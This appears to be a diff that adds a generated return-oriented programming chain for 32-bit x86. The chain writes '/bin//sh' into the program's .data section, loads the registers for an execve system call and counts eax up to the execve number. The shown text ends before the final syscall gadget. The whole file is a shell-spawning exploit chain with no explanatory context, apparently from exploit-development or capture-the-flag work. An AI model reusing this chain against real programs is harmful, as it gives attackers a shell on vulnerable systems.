@@ -1,0 +1,34 @@
+pop edx
+@ .data
+pop eax
+b'/bin'
+mov dword ptr [edx], eax
+pop edx
+@ .data + 4
+pop eax
+b'//sh'
+mov dword ptr [edx], eax
+pop edx
+@ .data + 8
+xor eax, eax
+mov dword ptr [edx], eax
+pop ebx
+@ .data
+pop ecx
+pop ebx
+@ .data + 8
+@ .data
+pop edx
+@ .data + 8
+xor eax, eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
